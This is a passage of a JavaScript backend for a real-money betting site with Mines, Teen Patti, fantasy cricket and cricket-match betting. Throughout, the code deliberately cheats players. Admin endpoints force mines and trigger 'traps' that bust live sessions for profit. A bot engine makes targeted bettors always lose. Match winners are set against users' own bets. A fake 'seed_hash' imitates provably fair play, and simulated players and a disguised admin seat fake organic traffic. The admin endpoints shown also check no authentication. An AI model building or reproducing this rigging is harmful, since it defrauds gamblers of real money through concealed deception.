        rig_active: MINES_RIG_CONFIG.matrix.some(m => m !== 'auto') || !!MINES_RIG_CONFIG.next_tile || !!MINES_RIG_CONFIG.rig_type || (MINES_RIG_CONFIG.target_users && MINES_RIG_CONFIG.target_users.length > 0)
      }
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/mines/start — Start a Mines game round
app.post('/api/mines/start', async (req, res) => {
  const { username = 'DemoUser', bet_amount = 10, mines_count = 3 } = req.body;
  const bet = parseFloat(bet_amount);
  const minesNum = parseInt(mines_count);

  try {
    const user = await getOrCreateUser(username);
    if (user.wallet_balance < bet) {
      return res.status(400).json({ ok: false, error: `Insufficient balance! You have ₹${user.wallet_balance.toFixed(2)}.` });
    }

    if (minesNum < 1 || minesNum > 24) {
      return res.status(400).json({ ok: false, error: 'Mines count must be between 1 and 24.' });
    }

    await prisma.user.update({
      where: { id: user.id },
      data: { wallet_balance: { decrement: bet } }
    });

    await prisma.transaction.create({
      data: {
        id: 'MINES_' + Date.now(),
        user: username,
        type: 'Withdrawal',
        amount: bet,
        details: `Mines Bet — ${minesNum} Mines`,
        status: 'Completed'
      }
    });

    const allIndices = Array.from({ length: 25 }, (_, i) => i);
    for (let i = allIndices.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [allIndices[i], allIndices[j]] = [allIndices[j], allIndices[i]];
    }
    let minePositions = allIndices.slice(0, minesNum);

    // Apply Admin Matrix Rig Overrides
    MINES_RIG_CONFIG.matrix.forEach((tileState, idx) => {
      if (tileState === 'mine' && !minePositions.includes(idx)) {
        minePositions.push(idx);
      } else if (tileState === 'safe' && minePositions.includes(idx)) {
        minePositions = minePositions.filter(m => m !== idx);
      }
    });

    const serverSeed = 'SEED_' + Math.random().toString(36).substring(2);
    markUserActive('mines', username);

    MINES_USER_SESSIONS[username] = {
      status: 'active',
      bet_amount: bet,
      mines_count: minesNum,
      server_seed: serverSeed,
      seed_hash: 'HASH_' + serverSeed,
      mine_positions: minePositions,
      revealed: [],
      multiplier: 1.0,
      potential_payout: 0
    };

    const updatedUser = await prisma.user.findUnique({ where: { id: user.id } });
    console.log(`[MINES] Game started for ${username} — Bet: ₹${bet}, Mines: ${minesNum}`);

    res.json({
      ok: true,
      state: {
        status: 'active',
        grid_size: 25,
        mines_count: minesNum,
        bet_amount: bet,
        revealed: [],
        multiplier: 1.0,
        potential_payout: 0,
        seed_hash: 'HASH_' + serverSeed,
        balance: updatedUser.wallet_balance
      }
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/mines/reveal — Reveal a tile on the Mines grid
app.post('/api/mines/reveal', async (req, res) => {
  const { username = 'DemoUser', index } = req.body;
  const tileIndex = parseInt(index);

  try {
    const session = MINES_USER_SESSIONS[username];
    if (!session || session.status !== 'active') {
      return res.status(400).json({ ok: false, error: 'No active game round.' });
    }

    if (tileIndex < 0 || tileIndex >= 25) {
      return res.status(400).json({ ok: false, error: 'Invalid tile index.' });
    }

    if (session.revealed.includes(tileIndex)) {
      return res.status(400).json({ ok: false, error: 'Tile already revealed.' });
    }

    let hitMine = session.mine_positions.includes(tileIndex);
    let wasRiggedThisReveal = false;

    // Check Admin Matrix Rig Override for this tile (existing, unchanged, highest precedence)
    const matrixTile = MINES_RIG_CONFIG.matrix[tileIndex] || 'auto';
    if (matrixTile === 'mine') {
      hitMine = true;
      wasRiggedThisReveal = true;
      if (!session.mine_positions.includes(tileIndex)) session.mine_positions.push(tileIndex);
    } else if (matrixTile === 'safe') {
      hitMine = false;
      wasRiggedThisReveal = true;
      session.mine_positions = session.mine_positions.filter(m => m !== tileIndex);
    }

    // Manual admin targeting/rig config (existing behavior) always takes full precedence over the
    // new autonomous bot engine below.
    const hasManualRigConfig = (MINES_RIG_CONFIG.target_users && MINES_RIG_CONFIG.target_users.length > 0) ||
                                !!MINES_RIG_CONFIG.next_tile || !!MINES_RIG_CONFIG.rig_type;

    if (hasManualRigConfig) {
      // Check Targeted Users Rig & Next-Click Overrides
      const isTargetedUser = !MINES_RIG_CONFIG.target_users ||
                            MINES_RIG_CONFIG.target_users.length === 0 ||
                            MINES_RIG_CONFIG.target_users.includes(username);

      if (isTargetedUser) {
        if (MINES_RIG_CONFIG.next_tile === 'mine' || MINES_RIG_CONFIG.rig_type === 'platform_profit') {
          hitMine = true;
          wasRiggedThisReveal = true;
          if (!session.mine_positions.includes(tileIndex)) session.mine_positions.push(tileIndex);
        } else if (MINES_RIG_CONFIG.next_tile === 'gem' || MINES_RIG_CONFIG.rig_type === 'guarantee_win') {
          hitMine = false;
          wasRiggedThisReveal = true;
          session.mine_positions = session.mine_positions.filter(m => m !== tileIndex);
        }
      }
    } else if (isBotTakeoverActive('mines').active && isUserTargeted('mines', username)) {
      // No manual rig is configured at all — the autonomous bot engine decides this reveal instead,
      // for a currently live-targeted user only. Being selected by the percentage-based targeting
      // engine (refreshBotTargeting — X% of currently live bettors, resampled continuously) IS the rig
      // decision here, with no further probability roll layered on top: every reveal a targeted user
      // makes is rigged in the house's favor, exactly like every other game (Color/Aviator/Football/
      // Cricket all rig deterministically once a user is targeted, never through a second independent
      // chance). This is what makes the configured percentage mean what it says: set it to 90%, and
      // 90% of the currently live bettors are the ones who get rigged — not 90% of 90%.
      hitMine = true;
      wasRiggedThisReveal = true;
      if (!session.mine_positions.includes(tileIndex)) session.mine_positions.push(tileIndex);
    }

    const user = await getOrCreateUser(username);

    if (hitMine) {
      session.status = 'busted';
      console.log(`[MINES] ${username} hit mine at tile #${tileIndex + 1} — BUSTED!`);

      return res.json({
        ok: true,
        hit_mine: true,
        state: {
          status: 'busted',
          grid_size: 25,
          mines_count: session.mines_count,
          bet_amount: session.bet_amount,
          revealed: session.revealed,
          multiplier: 0,
          potential_payout: 0,
          server_seed: session.server_seed,
          mine_positions: session.mine_positions,
          balance: user.wallet_balance,
          was_rigged: wasRiggedThisReveal
        }
      });
    }

    session.revealed.push(tileIndex);
    const newMult = calculateMinesMultiplier(25, session.mines_count, session.revealed.length);
    const newPayout = parseFloat((session.bet_amount * newMult).toFixed(2));

    session.multiplier = newMult;
    session.potential_payout = newPayout;

    console.log(`[MINES] ${username} revealed safe tile #${tileIndex + 1} — Multiplier: ${newMult}x (Payout: ₹${newPayout})`);

    res.json({
      ok: true,
      hit_mine: false,
      state: {
        status: 'active',
        grid_size: 25,
        mines_count: session.mines_count,
        bet_amount: session.bet_amount,
        revealed: session.revealed,
        multiplier: newMult,
        potential_payout: newPayout,
        balance: user.wallet_balance,
        was_rigged: wasRiggedThisReveal
      }
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/mines/cashout — Cashout active Mines round
app.post('/api/mines/cashout', async (req, res) => {
  const { username = 'DemoUser' } = req.body;

  try {
    const session = MINES_USER_SESSIONS[username];
    if (!session || session.status !== 'active') {
      return res.status(400).json({ ok: false, error: 'No active game to cash out.' });
    }

    if (session.revealed.length === 0) {
      return res.status(400).json({ ok: false, error: 'Reveal at least one tile before cashing out.' });
    }

    const payout = session.potential_payout;
    session.status = 'cashed';

    const user = await getOrCreateUser(username);
    await prisma.user.update({
      where: { id: user.id },
      data: { wallet_balance: { increment: payout } }
    });

    await prisma.transaction.create({
      data: {
        id: 'MINES_WIN_' + Date.now(),
        user: username,
        type: 'Deposit',
        amount: payout,
        details: `Mines Cash Out — ${session.multiplier}x`,
        status: 'Completed'
      }
    });

    const updatedUser = await prisma.user.findUnique({ where: { id: user.id } });
    console.log(`[MINES] ${username} cashed out ₹${payout} (${session.multiplier}x)!`);

    res.json({
      ok: true,
      payout: payout,
      state: {
        status: 'cashed',
        grid_size: 25,
        mines_count: session.mines_count,
        bet_amount: session.bet_amount,
        revealed: session.revealed,
        multiplier: session.multiplier,
        potential_payout: payout,
        server_seed: session.server_seed,
        mine_positions: session.mine_positions,
        balance: updatedUser.wallet_balance
      }
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

let MINES_TOTAL_TRAP_PROFIT = 0;

// POST /api/mines/admin/rig — Admin endpoint to configure Mines Matrix & Overrides & Trigger Traps
app.post('/api/mines/admin/rig', async (req, res) => {
  const { matrix, rig_type, next_tile, target_users, trigger_trap } = req.body;

  try {
    if (Array.isArray(matrix) && matrix.length === 25) {
      MINES_RIG_CONFIG.matrix = matrix;
    }
    if (rig_type !== undefined) {
      MINES_RIG_CONFIG.rig_type = rig_type || '';
    }
    if (next_tile !== undefined) {
      MINES_RIG_CONFIG.next_tile = next_tile || null;
    }
    if (Array.isArray(target_users)) {
      MINES_RIG_CONFIG.target_users = target_users;
    }

    let profitRealized = 0;
    let newlyTrappedCount = 0;

    // Handle Simultaneous Next Click Trap Triggering
    if (next_tile === 'mine' || trigger_trap) {
      MINES_RIG_CONFIG.next_tile = 'mine';
      const targetedSet = (MINES_RIG_CONFIG.target_users && MINES_RIG_CONFIG.target_users.length > 0)
        ? new Set(MINES_RIG_CONFIG.target_users)
        : null;

      // Process real user sessions only
      Object.keys(MINES_USER_SESSIONS).forEach(u => {
        const sess = MINES_USER_SESSIONS[u];
        const isTargeted = !targetedSet || targetedSet.has(u);
        if (sess && sess.status === 'active' && isTargeted) {
          profitRealized += parseFloat(sess.bet_amount || 0);
          newlyTrappedCount++;
          sess.status = 'busted';
        }
      });

      MINES_TOTAL_TRAP_PROFIT += profitRealized;
      console.log(`[MINES TRAP RIG] Executed trap on ${newlyTrappedCount} users! Profit realized: ₹${profitRealized.toFixed(2)}, Cumulative: ₹${MINES_TOTAL_TRAP_PROFIT.toFixed(2)}`);
    }

    await prisma.gameState.upsert({
      where: { key: 'mines_rig_config' },
      update: { data: MINES_RIG_CONFIG },
      create: { key: 'mines_rig_config', data: MINES_RIG_CONFIG }
    });

    res.json({
      success: true,
      rig: MINES_RIG_CONFIG,
      profit_realized: profitRealized,
      total_profit: MINES_TOTAL_TRAP_PROFIT,
      trapped_count: newlyTrappedCount,
      trapped_users: MINES_RIG_CONFIG.target_users
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/mines/admin/rig — Fetch current Mines rig configuration
app.get('/api/mines/admin/rig', async (req, res) => {
  try {
    const dbConfig = await prisma.gameState.findUnique({ where: { key: 'mines_rig_config' } });
    if (dbConfig && dbConfig.data) {
      MINES_RIG_CONFIG = dbConfig.data;
    }
    res.json({
      success: true,
      rig: MINES_RIG_CONFIG,
      total_profit: MINES_TOTAL_TRAP_PROFIT
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/mines/active-users — Fetch live list of active Mines users (real only)
app.get('/api/mines/active-users', async (req, res) => {
  try {
    const activeList = [];
    const botActive = isBotTakeoverActive('mines').active;

    // Only real active sessions
    Object.keys(MINES_USER_SESSIONS).forEach(u => {
      const sess = MINES_USER_SESSIONS[u];
      if (sess) {
        const betAmt = sess.bet_amount || 0;
        const potentialPayout = sess.potential_payout || 0;
        // Detonating a live session right now always locks in the full original stake as house
        // profit (a mine hit always zeroes the payout); letting the player cash out instead costs
        // the house whatever they've already earned above their stake. Same "profit if I act now"
        // framing as the Color/Aviator advisories — real numbers straight from this session's own
        // live state, not an estimate.
        activeList.push({
          username: u,
          type: 'Real Player',
          bet: betAmt,
          mines: sess.mines_count || 3,
          revealed: (sess.revealed || []).length,
          status: sess.status === 'active' ? 'Active' : (sess.status === 'busted' ? 'Trapped (Busted)' : sess.status),
          multiplier: sess.multiplier || 1.0,
          potential_payout: parseFloat(potentialPayout.toFixed(2)),
          profit_if_detonate_now: sess.status === 'active' ? parseFloat(betAmt.toFixed(2)) : 0,
          profit_if_cashout_now: sess.status === 'active' ? parseFloat((betAmt - potentialPayout).toFixed(2)) : 0,
          is_currently_targeted: sess.status === 'active' && botActive && isUserTargeted('mines', u)
        });
      }
    });

    res.json({
      success: true,
      total_count: activeList.length,
      users: activeList,
      total_profit: MINES_TOTAL_TRAP_PROFIT,
      rig: MINES_RIG_CONFIG,
      bot_active: botActive
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/mines/admin/reset-rig — Clear all Mines rig overrides
app.post('/api/mines/admin/reset-rig', async (req, res) => {
  try {
    MINES_RIG_CONFIG = {
      matrix: Array(25).fill('auto'),
      next_tile: null,
      rig_type: '',
      target_users: []
    };

    // Reset all active real sessions back to active
    Object.keys(MINES_USER_SESSIONS).forEach(u => {
      const sess = MINES_USER_SESSIONS[u];
      if (sess && sess.status === 'busted') {
        sess.status = 'active';
      }
    });

    await prisma.gameState.upsert({
      where: { key: 'mines_rig_config' },
      update: { data: MINES_RIG_CONFIG },
      create: { key: 'mines_rig_config', data: MINES_RIG_CONFIG }
    });

    console.log(`[MINES RIG] Admin reset all Mines rig overrides.`);

    res.json({
      success: true,
      rig: MINES_RIG_CONFIG,
      total_profit: MINES_TOTAL_TRAP_PROFIT
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/teenpatti/admin/reset-rig — Remove rig from a room
app.post('/api/teenpatti/admin/reset-rig', async (req, res) => {
  const { room_id } = req.body;
  if (!room_id) return res.status(400).json({ error: 'room_id required.' });

  try {
    await prisma.teenPattiRoom.update({
      where: { id: room_id },
      data: { admin_rig: null }
    });

    console.log(`[TP] Admin reset rig for ${room_id}`);
    res.json({ success: true, room_id });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// --- Sequential Organic Room Filling Engine ---
// Fills ONE seat in ONE waiting room each tick at staggered intervals.
// Rooms stay open (0/4 → 1/4 → 2/4 → 3/4) for a while before filling to 4/4 and starting.
// When a round ends, winner is shown for 5s, then room empties to 0/4.
// (TP_SIMULATED_NAMES / randomFillerName are defined near the top of the file, shared with every
// other seat auto-fill path.)

// Stagger function: adds 1 player to 1 waiting room every 6-12 seconds
function scheduleNextTrafficTick() {
  const delay = 6000 + Math.floor(Math.random() * 6000); // 6-12s
  setTimeout(async () => {
    try {
      const roomIds = ['room_101', 'room_102', 'room_103', 'room_104', 'room_105', 'room_106'];
      
      // Find all rooms that are waiting and have < 4 players
      const waitingRooms = [];
      for (const roomId of roomIds) {
        const room = await prisma.teenPattiRoom.findUnique({
          where: { id: roomId },
          include: { seats: { orderBy: { seat: 'asc' } } }
        });
        if (room && room.status === 'waiting') {
          const count = room.seats.filter(s => s.username).length;
          if (count < 4) waitingRooms.push({ room, count });
        }
      }

      if (waitingRooms.length > 0) {
        // Pick ONE random waiting room
        const target = waitingRooms[Math.floor(Math.random() * waitingRooms.length)];
        const emptySeats = target.room.seats.filter(s => !s.username);
        
        if (emptySeats.length > 0) {
          // Add exactly 1 player to the next empty seat — routed through nextRoomFillerUsername() so
          // a pending random admin-entry reservation (if due at this arrival count) is honored here,
          // making Admin's join look exactly like any other ordinary organic join.
          const nextSeat = emptySeats[0];
          const filler = nextRoomFillerUsername(target.room.id, target.count);

          await prisma.teenPattiSeat.update({
            where: { id: nextSeat.id },
            data: {
              username: filler.username,
              is_bot: filler.is_bot,
              folded: false,
              balance: 1000 + Math.floor(Math.random() * 5000)
            }
          });

          const newCount = target.count + 1;
          console.log(`[TP Sequential Traffic] ${filler.username} joined ${target.room.id} (Seat ${nextSeat.seat + 1}) — Count: ${newCount}/4`);

          // When room reaches 3 or 4, fill remaining and start round
          if (newCount >= 3) {
            scheduleBotFill(target.room.id);
          }
        }
      }
    } catch (err) { /* silent */ }
    
    // Schedule next tick
    scheduleNextTrafficTick();
  }, delay);
}

// Start the traffic engine
scheduleNextTrafficTick();

// Seed rooms on startup
tpSeedRooms().catch(e => console.error('[TP] Seed error:', e.message));

// ========================================================================
// CRICKET (YOUR ELEVEN) — FANTASY CRICKET BACKEND
// ========================================================================

const CRICKET_PLAYER_POOL = [
  { id: 1,  name: 'Rishabh Pant',     team: 'India', role: 'WK',   credits: 9.0 },
  { id: 2,  name: 'KL Rahul',         team: 'India', role: 'WK',   credits: 8.5 },
  { id: 3,  name: 'Rohit Sharma',     team: 'India', role: 'BAT',  credits: 10.0 },
  { id: 4,  name: 'Virat Kohli',      team: 'India', role: 'BAT',  credits: 10.5 },
  { id: 5,  name: 'Yashasvi Jaiswal', team: 'India', role: 'BAT',  credits: 9.5 },
  { id: 6,  name: 'Ravindra Jadeja',  team: 'India', role: 'AR',   credits: 9.5 },
  { id: 7,  name: 'Hardik Pandya',    team: 'India', role: 'AR',   credits: 9.0 },
  { id: 8,  name: 'Jasprit Bumrah',   team: 'India', role: 'BOWL', credits: 10.0 },
  { id: 9,  name: 'Mohammed Siraj',   team: 'India', role: 'BOWL', credits: 8.5 },
  { id: 10, name: 'Kuldeep Yadav',    team: 'India', role: 'BOWL', credits: 8.0 },
  { id: 11, name: 'Arshdeep Singh',   team: 'India', role: 'BOWL', credits: 8.0 },
  { id: 12, name: 'Josh Inglis',      team: 'Australia', role: 'WK',   credits: 8.5 },
  { id: 13, name: 'Alex Carey',       team: 'Australia', role: 'WK',   credits: 8.0 },
  { id: 14, name: 'Travis Head',      team: 'Australia', role: 'BAT',  credits: 10.0 },
  { id: 15, name: 'Steve Smith',      team: 'Australia', role: 'BAT',  credits: 9.5 },
  { id: 16, name: 'Mitchell Marsh',   team: 'Australia', role: 'BAT',  credits: 9.0 },
  { id: 17, name: 'Glenn Maxwell',    team: 'Australia', role: 'AR',   credits: 9.5 },
  { id: 18, name: 'Marcus Stoinis',   team: 'Australia', role: 'AR',   credits: 9.0 },
  { id: 19, name: 'Pat Cummins',      team: 'Australia', role: 'BOWL', credits: 9.5 },
  { id: 20, name: 'Mitchell Starc',   team: 'Australia', role: 'BOWL', credits: 9.5 },
  { id: 21, name: 'Josh Hazlewood',   team: 'Australia', role: 'BOWL', credits: 9.0 },
  { id: 22, name: 'Adam Zampa',       team: 'Australia', role: 'BOWL', credits: 8.5 }
];

function simulateCricketPlayerStats(role) {
  let runs = 0, fours = 0, sixes = 0, wickets = 0, maidens = 0;
  let catches = 0, stumpings = 0, runouts = 0;
  const battingRoles = ['BAT', 'WK', 'AR'];
  const bowlingRoles = ['BOWL', 'AR'];
  if (battingRoles.includes(role)) {
    const roll = Math.floor(Math.random() * 100) + 1;
    if (roll <= 10) runs = 0;
    else if (roll <= 40) runs = Math.floor(Math.random() * 20) + 1;
    else if (roll <= 70) runs = Math.floor(Math.random() * 25) + 21;
    else if (roll <= 90) runs = Math.floor(Math.random() * 30) + 46;
    else runs = Math.floor(Math.random() * 35) + 76;
    if (runs > 0) {
      fours = Math.floor(runs / (6 + Math.floor(Math.random() * 5)));
      sixes = Math.floor(runs / (15 + Math.floor(Math.random() * 11)));
    }
  }
  if (bowlingRoles.includes(role)) {
    const roll = Math.floor(Math.random() * 100) + 1;
    if (roll <= 20) wickets = 0;
    else if (roll <= 55) wickets = Math.floor(Math.random() * 2) + 1;
    else if (roll <= 85) wickets = Math.floor(Math.random() * 2) + 2;
    else wickets = Math.floor(Math.random() * 3) + 3;
    maidens = (Math.floor(Math.random() * 100) + 1 <= 20) ? 1 : 0;
  }
  if (Math.floor(Math.random() * 100) + 1 <= 30) catches = Math.floor(Math.random() * 2) + 1;
  if (role === 'WK' && Math.floor(Math.random() * 100) + 1 <= 15) stumpings = 1;
  if (Math.floor(Math.random() * 100) + 1 <= 10) runouts = 1;
  return { runs, fours, sixes, wickets, maidens, catches, stumpings, runouts };
}

function computeFantasyPoints(s, role) {
  let pts = 0;
  pts += s.runs * 1;
  pts += s.fours * 1;
  pts += s.sixes * 2;
  if (s.runs >= 100) pts += 16;
  else if (s.runs >= 50) pts += 8;
  else if (s.runs >= 30) pts += 4;
  if (s.runs === 0 && ['BAT', 'WK', 'AR'].includes(role)) pts -= 2;
  pts += s.wickets * 25;
  if (s.wickets >= 5) pts += 8;
  else if (s.wickets >= 3) pts += 4;
  pts += s.maidens * 4;
  pts += s.catches * 8;
  pts += s.stumpings * 12;
  pts += s.runouts * 6;
  return pts;
}

// GET /api/cricket/matches — Available matches
app.get('/api/cricket/matches', (req, res) => {
  res.json({
    matches: [
      { id: 'm1', teamA: 'India', teamB: 'Australia', title: 'ICC T20 World Cup Clash', entry_fee: 50 },
      { id: 'm2', teamA: 'India', teamB: 'England', title: 'ODI Series Match 3', entry_fee: 100 },
      { id: 'm3', teamA: 'Australia', teamB: 'South Africa', title: 'Test Championship Qualifier', entry_fee: 75 }
    ]
  });
});

// POST /api/cricket/submit-team — Submit fantasy team, deduct entry fee, simulate, store results
app.post('/api/cricket/submit-team', async (req, res) => {
  const { username, player_ids, captain_id, vice_id, match_id, entry_fee } = req.body;
  if (!username || !player_ids || !captain_id || !vice_id) {
    return res.status(400).json({ error: 'Missing required fields.' });
  }
  try {
    const ids = Array.isArray(player_ids) ? player_ids.map(Number) : player_ids.split(',').map(Number);
    if (ids.length !== 11) return res.status(400).json({ error: 'Must select exactly 11 players.' });

    const fee = parseFloat(entry_fee) || 50;
    const user = await getOrCreateUser(username);
    if (user.wallet_balance < fee) {
      return res.status(400).json({ error: `Insufficient balance. Need ₹${fee}, have ₹${user.wallet_balance.toFixed(2)}.` });
    }
    markUserActive('youreleven', username);

    // Deduct entry fee
    await prisma.user.update({ where: { id: user.id }, data: { wallet_balance: { decrement: fee } } });
    await prisma.transaction.create({
      data: {
        id: 'CRICKET_' + Date.now(),
        user: username,
        type: 'Withdrawal',
        amount: fee,
        details: `Fantasy Cricket Entry Fee — Match ${match_id || 'm1'}`,
        status: 'Completed'
      }
    });

    // Simulate match
    const simResults = {};
    CRICKET_PLAYER_POOL.forEach(p => {
      const stats = simulateCricketPlayerStats(p.role);
      stats.points = computeFantasyPoints(stats, p.role);
      simResults[p.id] = stats;
    });

    const captainId = Number(captain_id);
    const viceId = Number(vice_id);
    let teamTotal = 0;
    const breakdown = ids.map(pid => {
      const player = CRICKET_PLAYER_POOL.find(p => p.id === pid);
      const stats = simResults[pid] || { runs: 0, fours: 0, sixes: 0, wickets: 0, maidens: 0, catches: 0, stumpings: 0, runouts: 0, points: 0 };
      let multiplier = 1.0;
      if (pid === captainId) multiplier = 2.0;
      else if (pid === viceId) multiplier = 1.5;
      const finalPoints = stats.points * multiplier;
      teamTotal += finalPoints;
      return {
        id: pid, name: player ? player.name : `Player ${pid}`, team: player ? player.team : 'Unknown',
        role: player ? player.role : 'BAT', stats, base_points: stats.points,
        multiplier, final_points: finalPoints,
        is_captain: pid === captainId, is_vice: pid === viceId
      };
    });
    breakdown.sort((a, b) => b.final_points - a.final_points);

    // Calculate payout based on performance
    let payout = 0;
    if (teamTotal >= 200) payout = fee * 5;
    else if (teamTotal >= 150) payout = fee * 3;
    else if (teamTotal >= 100) payout = fee * 2;
    else if (teamTotal >= 75) payout = fee * 1.5;
    else if (teamTotal >= 50) payout = fee * 1;

    // Bot targeting: a currently live-targeted user's entry always forfeits, regardless of performance.
    const was_rigged = isBotTakeoverActive('youreleven').active && isUserTargeted('youreleven', username);
    if (was_rigged) payout = 0;

    if (payout > 0) {
      await prisma.user.update({ where: { id: user.id }, data: { wallet_balance: { increment: payout } } });
      await prisma.transaction.create({
        data: {
          id: 'CRICKET_WIN_' + Date.now(),
          user: username,
          type: 'Deposit',
          amount: payout,
          details: `Fantasy Cricket Payout — ${teamTotal.toFixed(0)} pts`,
          status: 'Completed'
        }
      });
    }

    // Store in GameBet table
    await prisma.gameBet.create({
      data: {
        username, game: 'cricket', bet_amount: fee, payout,
        status: payout > 0 ? 'won' : 'lost',
        metadata: { match_id, team_total: teamTotal, captain_id: captainId, vice_id: viceId, player_ids: ids, was_rigged },
        settled_at: new Date()
      }
    });

    const updatedUser = await prisma.user.findUnique({ where: { id: user.id } });
    res.json({ success: true, breakdown, team_total: teamTotal, payout, balance: updatedUser.wallet_balance, was_rigged });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/cricket/history — User's match history
app.get('/api/cricket/history', async (req, res) => {
  const username = req.query.username || 'DemoUser';
  try {
    const bets = await prisma.gameBet.findMany({
      where: { username: { equals: username, mode: 'insensitive' }, game: 'cricket' },
      orderBy: { created_at: 'desc' },
      take: 20
    });
    res.json({ success: true, history: bets });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ========================================================================
// BOUNDARY BAAZI — CRICKET BETTING BACKEND
// ========================================================================

// POST /api/boundarybaazi/place-bet — Place a bet on batting outcome
// In-memory per-match authoritative winner decisions, keyed by the client's match round id
// (matchState.roundId). Written once by /decide-match right when betting locks for that match,
// read by /settle so a "winner_A"/"winner_B" bet's outcome is a real server fact the client cannot
// override — closing the gap where Boundary Baazi used to let the browser simulate and self-report
// its own match result. Short-lived by nature (one match lasts a few minutes), so in-memory is fine —
// same pattern as MINES_USER_SESSIONS elsewhere in this file.
const BOUNDARY_MATCH_DECISIONS = {};

app.post('/api/boundarybaazi/place-bet', async (req, res) => {
  const { username, bet_amount, bet_type, selection, match_id, odds } = req.body;
  const betAmt = parseFloat(bet_amount);
  if (!username || isNaN(betAmt) || betAmt <= 0 || !bet_type) {
    return res.status(400).json({ error: 'Invalid bet details.' });
  }
  try {
    const user = await getOrCreateUser(username);
    if (user.wallet_balance < betAmt) {
      return res.status(400).json({ error: 'Insufficient balance.' });
    }
    markUserActive('boundary', username);
    await prisma.user.update({ where: { id: user.id }, data: { wallet_balance: { decrement: betAmt } } });
    await prisma.transaction.create({
      data: {
        id: 'BB_' + Date.now(),
        user: username, type: 'Withdrawal', amount: betAmt,
        details: `Boundary Baazi Bet — ${bet_type}: ${selection || 'N/A'}`,
        status: 'Completed'
      }
    });

    const gameBet = await prisma.gameBet.create({
      data: {
        username, game: 'boundarybaazi', bet_amount: betAmt,
        status: 'active',
        // match_id ties this bet to a specific match's server-decided winner (see /decide-match);
        // odds is stored here so /settle always pays exactly what was offered at bet time, never a
        // caller-supplied multiplier.
        metadata: { bet_type, selection, match_id: match_id || null, odds: parseFloat(odds) || 2.0 }
      }
    });

    const updatedUser = await prisma.user.findUnique({ where: { id: user.id } });
    res.json({ success: true, bet_id: gameBet.id, balance: updatedUser.wallet_balance });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/boundarybaazi/cancel-bet — Refund an active, not-yet-settled bet (betting still open)
app.post('/api/boundarybaazi/cancel-bet', async (req, res) => {
  const { bet_id, username } = req.body;
  if (!bet_id || !username) return res.status(400).json({ error: 'bet_id and username required.' });
  try {
    const gameBet = await prisma.gameBet.findUnique({ where: { id: bet_id } });
    if (!gameBet || gameBet.status !== 'active') return res.status(400).json({ error: 'Bet not found or already settled.' });
    if (gameBet.username.toLowerCase() !== String(username).toLowerCase()) {
      return res.status(403).json({ error: 'This bet does not belong to this user.' });
    }

    const user = await getOrCreateUser(username);
    await prisma.user.update({ where: { id: user.id }, data: { wallet_balance: { increment: gameBet.bet_amount } } });
    await prisma.transaction.create({
      data: {
        id: 'BB_CANCEL_' + Date.now(),
        user: username, type: 'Deposit', amount: gameBet.bet_amount,
        details: `Boundary Baazi Bet Cancelled — ${gameBet.metadata.bet_type}`,
        status: 'Completed'
      }
    });
    await prisma.gameBet.update({ where: { id: bet_id }, data: { status: 'cancelled', settled_at: new Date() } });

    const updatedUser = await prisma.user.findUnique({ where: { id: user.id } });
    res.json({ success: true, balance: updatedUser.wallet_balance });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/boundarybaazi/decide-match — Authoritative match-winner decision, made once betting
// locks. Mirrors the precedence every other game uses: manual admin override > live bot targeting >
// fair coin flip. The client's existing ball-by-ball simulation then visually steers its own innings
// scores toward this exact winner (unchanged logic, just fed a trustworthy source instead of a
// browser-local "cheat" flag), so what the player watches always matches what they get paid.
app.post('/api/boundarybaazi/decide-match', async (req, res) => {
  const { username, match_id } = req.body;
  if (!username || !match_id) return res.status(400).json({ error: 'username and match_id required.' });
  try {
    markUserActive('boundary', username);

    // What did this user actually back on the moneyline for this match?
    const bets = await prisma.gameBet.findMany({
      where: { username: { equals: username, mode: 'insensitive' }, game: 'boundarybaazi', status: 'active' }
    });
    const matchBets = bets.filter(b => b.metadata && b.metadata.match_id === match_id);
    const hasWinnerA = matchBets.some(b => b.metadata.bet_type === 'winner' && b.metadata.selection === 'A');
    const hasWinnerB = matchBets.some(b => b.metadata.bet_type === 'winner' && b.metadata.selection === 'B');

    let winner = null;
    let was_rigged = false;

    const overrideRecord = await prisma.gameState.findUnique({ where: { key: 'boundary_override' } });
    const override = overrideRecord ? overrideRecord.data : {};

    if (override && override.winner) {
      winner = override.winner;
      was_rigged = true;
    } else if (override && override.rig_type && override.rig_type !== 'none') {
      if (override.rig_type === 'platform_profit') {
        if (hasWinnerA && !hasWinnerB) winner = 'B';
        else if (hasWinnerB && !hasWinnerA) winner = 'A';
        else if (hasWinnerA && hasWinnerB) winner = 'tie';
      } else if (override.rig_type === 'user_win') {
        if (hasWinnerA && !hasWinnerB) winner = 'A';
        else if (hasWinnerB && !hasWinnerA) winner = 'B';
      }
      was_rigged = !!winner;
    } else {
      const botActive = isBotTakeoverActive('boundary').active;
      const targeted = botActive && isUserTargeted('boundary', username);
      if (targeted) {
        const botDecision = shouldBotRigThisRound('boundary');
        if (botDecision.shouldRig) {
          if (hasWinnerA && !hasWinnerB) winner = 'B';
          else if (hasWinnerB && !hasWinnerA) winner = 'A';
          else if (hasWinnerA && hasWinnerB) winner = 'tie';
          was_rigged = !!winner;
        }
      }
    }

    if (!winner) {
      // Fair round: genuine server coin flip, independent of anything the client could influence.
      const r = Math.random();
      winner = r < 0.48 ? 'A' : (r < 0.96 ? 'B' : 'tie');
      was_rigged = false;
    }

    BOUNDARY_MATCH_DECISIONS[match_id] = { winner, was_rigged, decided_at: Date.now() };
    res.json({ success: true, winner, was_rigged });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/boundarybaazi/settle — Settle a bet. For the match-winner market, the outcome is looked
